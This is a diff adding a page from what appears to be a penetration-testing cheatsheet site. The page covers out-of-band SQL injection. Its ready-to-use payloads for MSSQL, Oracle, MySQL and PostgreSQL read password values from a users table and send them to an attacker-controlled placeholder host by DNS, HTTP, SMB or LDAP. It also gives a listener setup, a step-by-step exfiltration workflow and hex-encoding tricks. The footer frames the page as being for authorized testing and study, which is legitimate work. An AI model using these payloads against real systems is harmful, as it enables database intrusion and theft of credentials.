@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Out-of-band SQLi · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › SQL Injection</nav><h1>Out-of-band SQLi</h1><p class="cx-lede">Exfiltrating data via DNS or HTTP when no in-band feedback is available.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1213, T1071.004</span><span class="cx-tag">D3FEND D3-MH, D3-OTF, D3-NTA</span><span class="cx-tag">IMPACT DataExfil</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><div class="cx-aside cx-note">
+<p class="cx-aside-title">Note</p>
+<p>This page is a known stub. It will be expanded with detailed payloads and case studies as this cluster is expanded.</p>
+</div>
+<p>When the application returns no error, no reflected output, no behavioural change, and no observable timing difference, the database can still leak data - by making it talk to a server you control. Trigger a DNS lookup or HTTP request from the database and read the data on your end.</p>
+<h2 id="tldr">TL;DR</h2>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">MSSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27;; DECLARE @data varchar(1024); SELECT @data = (SELECT TOP 1 password FROM users);
+   EXEC(&#x27;master..xp_dirtree &quot;\\&#x27;+@data+&#x27;.&lt;ATTACKER&gt;\share&quot;&#x27;)-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Oracle (HTTP)</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; || (SELECT UTL_HTTP.REQUEST(&#x27;http://&#x27;||(SELECT password FROM users WHERE rownum=1)||&#x27;.&lt;ATTACKER&gt;&#x27;) FROM dual)-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Oracle (LDAP)</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; || (SELECT DBMS_LDAP.INIT((SELECT password FROM users WHERE rownum=1)||&#x27;.&lt;ATTACKER&gt;&#x27;,80) FROM dual)-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">MySQL (Windows)</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- UNC path triggers SMB lookup; Windows MySQL only
+&#x27; UNION SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(SELECT password FROM users LIMIT 1),&#x27;.&lt;ATTACKER&gt;\\share&#x27;))-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">PostgreSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Requires superuser
+&#x27;; COPY (SELECT &#x27;&#x27;) TO PROGRAM &#x27;nslookup &#x27;||(SELECT password FROM users LIMIT 1)||&#x27;.&lt;ATTACKER&gt;&#x27;-- -</code></pre></figure>
+</div>
+</div>
+<h2 id="when-to-use">When to use</h2>
+<table>
+<thead>
+<tr>
+<th>Condition</th>
+<th>Use OOB?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Visible errors / output</td>
+<td>No - use <a href="../union-based/index.html">UNION-based</a></td>
+</tr>
+<tr>
+<td>Boolean oracle works</td>
+<td>No - use <a href="../blind-boolean/index.html">Boolean blind</a></td>
+</tr>
+<tr>
+<td>Time delays measurable</td>
+<td>No - use <a href="../blind-time/index.html">Time blind</a></td>
+</tr>
+<tr>
+<td>None of the above + DB has egress</td>
+<td><strong>Yes</strong></td>
+</tr>
+</tbody>
+</table>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>OOB requires the database server to reach the internet. Many production databases are firewalled and cannot. DNS often gets through where HTTP doesn't.</p>
+</div>
+<h2 id="setting-up-the-listener">Setting up the listener</h2>
+<p>Use <a href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a>, <a href="https://github.com/projectdiscovery/interactsh">interactsh</a>, or your own DNS server.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># interactsh
+interactsh-client
+# Returns a unique &lt;id&gt;.oast.fun (or similar) host
+# Use this in payloads as &lt;ATTACKER&gt;</code></pre></figure>
+<p>Each DNS lookup or HTTP request to <code>&lt;extracted_data&gt;.&lt;id&gt;.oast.fun</code> shows up in the client output, with the leaked data as a subdomain label.</p>
+<h2 id="workflow">Workflow</h2>
+<div class="cx-steps">
+<ol>
+<li><strong>Confirm OOB egress</strong> - fire a payload that just triggers a callback with a static value:</li>
+</ol>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; || (SELECT UTL_HTTP.REQUEST(&#x27;http://test.&lt;ATTACKER&gt;&#x27;) FROM dual)-- -</code></pre></figure>
+<p>If <code>test.&lt;ATTACKER&gt;</code> shows up in your collaborator, the DB can egress.</p>
+<ol start="2">
+<li><strong>Replace the static value with a query</strong> - extract data:</li>
+</ol>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; || (SELECT UTL_HTTP.REQUEST(&#x27;http://&#x27;||(SELECT password FROM users WHERE rownum=1)||&#x27;.&lt;ATTACKER&gt;&#x27;) FROM dual)-- -</code></pre></figure>
+<ol start="3">
+<li><strong>Read the leaked data</strong> in the collaborator/interactsh output. The subdomain label <em>is</em> the extracted value.</li>
+</ol>
+</div>
+<h2 id="dns-character-restrictions">DNS character restrictions</h2>
+<p>DNS labels allow only <code>a-z 0-9 -</code> and are limited to 63 chars per label. Encode binary data as hex:</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">MySQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;, HEX((SELECT password FROM users LIMIT 1)), &#x27;.&lt;ATTACKER&gt;\\share&#x27;))-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Oracle</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; || (SELECT UTL_HTTP.REQUEST(&#x27;http://&#x27; || RAWTOHEX(UTL_RAW.CAST_TO_RAW((SELECT password FROM users WHERE rownum=1))) || &#x27;.&lt;ATTACKER&gt;&#x27;) FROM dual)-- -</code></pre></figure>
+</div>
+</div>
+<p>For data &gt; 63 chars, split into chunks across multiple labels or multiple lookups.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li>OOB is the slowest but most reliable extraction class for fully-blind targets.</li>
+<li>DNS exfil is preferred over HTTP - UDP/53 is rarely blocked outbound, even when 80/443 are.</li>
+<li>This is one of the few SQLi classes that requires the database server to have outbound network access. Fully-isolated databases cannot be exfiltrated this way.</li>
+<li>For large extractions, prefer building a small bash loop that splits the data at the SQL layer and pages through it, rather than trying to fit everything into one DNS label.</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../blind-error/index.html">Previous: Error-based Blind SQLi</a><a class="cx-next" href="../second-order/index.html">Next: Second-order SQLi</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
